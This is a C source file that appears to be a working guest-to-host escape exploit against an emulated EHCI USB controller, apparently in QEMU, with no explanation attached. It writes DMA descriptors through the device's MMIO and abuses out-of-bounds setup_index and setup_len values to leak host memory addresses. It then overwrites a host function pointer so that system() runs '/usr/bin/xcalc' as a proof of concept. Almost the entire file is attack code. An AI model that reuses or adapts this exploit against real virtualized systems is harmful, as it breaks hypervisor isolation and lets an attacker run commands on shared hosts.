#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <errno.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <stdbool.h>
#include <netinet/in.h>  
unsigned char* mmio_mem;
char *dmabuf;
struct ohci_hcca * hcca;
struct EHCIqtd * qtd;
struct ohci_ed * ed;
struct ohci_td * td;
char *setup_buf;
uint32_t *dmabuf32;
char *td_addr;
struct EHCIqh * qh;
struct ohci_td * td_1;
char *dmabuf_phys_addr;
typedef struct USBDevice USBDevice;
typedef struct USBEndpoint USBEndpoint;
struct USBEndpoint {
    uint8_t nr;
    uint8_t pid;
    uint8_t type;
    uint8_t ifnum;
    int max_packet_size;
    int max_streams;
    bool pipeline;
    bool halted;
    USBDevice *dev;
    USBEndpoint *fd;
    USBEndpoint *bk;
};

struct USBDevice {
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[15];
    USBEndpoint ep_out[15];
};


typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;

    /* endpoint capabilities */
    uint32_t epcap;

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */

} EHCIqh;
typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;

    uint32_t bufptr[5];               /* Standard buffer pointer */

} EHCIqtd;
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;
	
    // Assert page alignment

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");
    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);
     
    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");
    // Assert page present
     

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000+(virt&0xfff);
    return phys;
}
 
void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}
void init(){

int mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.7/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");


dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");
    mlock(dmabuf, 0x3000);
hcca=dmabuf;
dmabuf32=dmabuf+4;
qtd=dmabuf+0x200;
qh=dmabuf+0x100;
setup_buf=dmabuf+0x300;

}
void init_state(){
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);
qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
struct EHCIqtd * qtd;
qtd=dmabuf+0x200;
qtd->token=1<<7 | 2<<8 | 8<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x300);
setup_buf[6]=0xff;
setup_buf[7]=0x0;
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);
}
void set_length(uint16_t len,uint8_t in){
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);
setup_buf[0]=in;
setup_buf[6]=len&0xff;
setup_buf[7]=(len>>8)&0xff;
qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);


qtd->token=1<<7 | 2<<8 | 8<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x300);
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);
}
void do_copy_read(){
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);

qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
qtd->token=1<<7 | 1<<8 | 0x1f00<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x1000);
qtd->bufptr[1]=virt2phys(dmabuf+0x2000);
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);

}
int main()
{

init();

iopl(3);
outw(0,0xc0c0);
outw(0,0xc0e0);
outw(0,0xc010);
outw(0,0xc0a0);
sleep(3);
init_state();
sleep(2);
set_length(0x2000,0x80);
sleep(2);
do_copy_read();
sleep(2);
struct USBDevice* usb_device_tmp=dmabuf+0x2004;
struct USBDevice usb_device;
memcpy(&usb_device,usb_device_tmp,sizeof(USBDevice));

uint64_t dev_addr=usb_device.ep_ctl.dev;



uint64_t *tmp=dmabuf+0x24f4;
long long base=*tmp;
if(base == 0){
printf("DO IT AGAIN");
return 0;
}

base-=0xee5480-0x2668c0;
uint64_t system=base+0x2d9610;
puts("\\\\\\\\\\\\\\\\\\\\\\\\");

printf("LEAK BASE ADDRESS:%llx!\n",base);
printf("LEAK SYSTEM ADDRESS:%llx!\n",system);
puts("\\\\\\\\\\\\\\\\\\\\\\\\");
puts("INIT : DONE!");
sleep(2);
init_state();
sleep(2);
set_length(0x1024,0x0);
sleep(2);
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);

qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
qtd->token=1<<7 | 0<<8 | 0x1f00<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x1000);
qtd->bufptr[1]=virt2phys(dmabuf+0x2000);
usb_device_tmp=dmabuf+0x2000;
usb_device_tmp->ep_ctl.dev=0x100;
usb_device_tmp->setup_state=2;
usb_device_tmp->setup_index=0xfffffff8-0x1024;
usb_device_tmp->setup_len=0x1024;
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;
mlock(dmabuf, 0x3000);
sleep(1);
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);
sleep(2);


////////////////////

dmabuf[0x1000]=0x80;
uint32_t *dmabuf_32=dmabuf+0x2008;
dmabuf_32[0]=0xabababab;
dmabuf_32[1]=0x2;
dmabuf_32[2]=0x100;
dmabuf_32[3]=0xffffff24-0x101c;
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);
qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
qtd->token=1<<7 | 0<<8 | 0x1f00<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x1000);
qtd->bufptr[1]=virt2phys(dmabuf+0x2000);
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;

mlock(dmabuf, 0x3000);
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);
sleep(2);
do_copy_read();
sleep(2);
mlock(dmabuf, 0x3000);
tmp=dmabuf+0x1040;

long long ohci_addr=*tmp;

puts("STAGE 2 : DONE!");

/////////////////////////////
sleep(2);

init_state();
sleep(2);
set_length(0x1014,0x0);
sleep(2);
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);

qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
qtd->token=1<<7 | 0<<8 | 0x1f00<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x1000);
qtd->bufptr[1]=virt2phys(dmabuf+0x2000);
uint64_t *dmabuf64=dmabuf+0x1504;
memcpy(dmabuf+0x1604,"/usr/bin/xcalc",20);

dmabuf64[0]=system;
dmabuf64[1]=dev_addr+0x6e0;

usb_device_tmp=dmabuf+0x2000;
usb_device_tmp->ep_ctl.dev=0x100;

usb_device_tmp->setup_state=2;
usb_device_tmp->setup_index=(ohci_addr-dev_addr-0xdc+0xb8)-0x1014;
usb_device_tmp->setup_len=0x1014;
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;
mlock(dmabuf, 0x3000);
sleep(1);
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);
sleep(2);




dmabuf[0x1000]=0x80;
uint64_t *dmabuf_64=dmabuf+0x1000;
*dmabuf_64=dev_addr+0x5e0-0x28;
mmio_write(0x64,0x100);
mmio_write(0x64,0x4);
qh->epchar=0x00;
qh->token=1<<7;
qh->current_qtd=virt2phys(dmabuf+0x200);
qtd->token=1<<7 | 0<<8 | 0x8<<16;
qtd->bufptr[0]=virt2phys(dmabuf+0x1000);
qtd->bufptr[1]=virt2phys(dmabuf+0x2000);
dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;

mlock(dmabuf, 0x3000);
mmio_write(0x28,0x0);
mmio_write(0x30,0x0);
mmio_write(0x38,virt2phys(dmabuf));
mmio_write(0x34,virt2phys(dmabuf));
mmio_write(0x20,0x11);

sleep(2);

mmio_write(0x24,0x11);
}
